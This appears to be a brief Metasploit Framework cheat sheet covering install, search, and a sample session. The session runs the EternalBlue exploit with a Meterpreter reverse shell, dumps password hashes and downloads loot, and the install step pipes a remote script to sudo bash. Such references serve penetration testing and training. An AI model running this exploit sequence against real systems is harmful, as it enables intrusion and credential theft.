 Metasploit Framework

1. Overview
Metasploit Framework is one of the most powerful and widely used exploitation platforms.  
It provides exploits, payloads, auxiliary modules, post-exploitation tools, and an environment for writing custom modules.
Used in:
- Penetration testing  
- Red teaming  
- Exploit development  
- Post-exploitation & privilege escalation  

---

2. Key Features
- 2000+ exploits  
- Meterpreter shells  
- Post-exploitation modules  
- Auxiliary scanning modules  
- Payload generation  
- Database integration  
- Support for writing custom modules  

---

3. Installation

Kali Linux (pre-installed)
sudo apt update
sudo apt install metasploit-framework
Ubuntu / Debian
curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfinstall | sudo bash

Windows
Download installer:
https://www.metasploit.com/download

---

4. Starting Metasploit
msfconsole

---

5. Common Commands
Searching
search smb
search type:exploit apache

Using a module
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
run

Post-Exploitation Meterpreter
sysinfo
hashdump
upload file.txt
download loot.txt
shell

Database Integration
msfdb init
hosts
services
vulns
